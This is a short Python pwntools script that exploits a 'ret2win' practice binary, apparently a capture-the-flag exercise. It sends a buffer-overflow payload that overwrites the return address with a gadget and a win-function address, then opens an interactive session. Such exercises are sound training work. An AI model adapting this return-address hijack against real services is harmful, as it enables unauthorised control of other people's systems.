#!/usr/bin/env python3

from pwn import *

exe = ELF("./ret2win_patched")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    
    pause()

    r.recvuntil(b"> ")
    
    r.send(b"A"*(32) + b"B"*8 + p64(0x40053e) + p64(0x400756))

    r.recvline()
    r.recvline()

    r.interactive()


if __name__ == "__main__":
    main()
